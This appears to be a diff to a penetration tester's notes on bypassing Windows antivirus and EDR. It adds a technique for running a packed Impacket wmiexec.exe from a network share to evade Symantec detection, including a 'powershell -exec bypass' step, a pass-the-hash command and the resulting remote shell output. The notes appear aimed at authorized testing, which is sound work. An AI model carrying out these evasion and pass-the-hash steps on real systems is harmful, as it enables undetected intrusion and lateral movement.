@@ -92,7 +92,29 @@ Notes:
 - For Windows systems it allows to enter any password protected profile without any knowledge of the password.
 
 
-Example 4 - Find & exploit a local privesc flaw on the Windows laptop/workstation, then disable or bypass the AV protection
+Example 4 - Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
+===========================================================================================================================
+On a Windows laptop protected by a Symantec (EPP) Antivirus, my recompiled/packed version of wmiexec.exe was detected and deleted when I uploaded it, 
+however it was not detected nor blocked when I ran it from a remote shared folder.
+
+Step 1 - Start a PowerShell commnd prompt
+         ➤ C:\> powershell -exec bypass
+         
+Step 2 - Mount the network file share which contains your pentest tools
+         ➤ PS C:\> cd \\servername\share-pentest\
+            PS \\servername\share-pentest> 
+           
+Step 3 - Run your pentest tool (which is stored remotely on the shared folder - it is generally slow)
+
+         ➤ PS \\servername\share-pentest > wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:ad5f04d33d00db5f<SNIP> admin-user@<IP>
+            Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
+            [*] SMBv3.0 dialect used
+            [!] Launching semi-interactive shell - Careful what you execute
+            [!] Press help for extra shell commands
+            C:\>
+                  
+                  
+Example 5 - Find & exploit a local privesc flaw on the Windows laptop/workstation, then disable or bypass the AV protection
 ===========================================================================================================================
 Step 1 - Find and exploit a local privesc flaw
          ➤ Exploiting security misconfiguration
@@ -112,13 +134,14 @@ Step 1 - Find and exploit a local privesc flaw
 Step 2 - Disable or bypass the AV and EDR software using one of techniques listed in the next section
 
 
+
 ===========================================================================================================================
 Context 2 - You are local administrator of the Windows laptop/workstation
 ===========================================================================================================================
 
 Example 1 - When you can't stop or disable the AV software (even as local admin)
 ===========================================================================================================================
-Step 1 - Download and install VirtualBox or VMware Workstation the Windows laptop/workstation
+Step 1 - Download and install VirtualBox or VMware Workstation on the Windows laptop/workstation
 
 Step 2 - Create a Kali VM
 
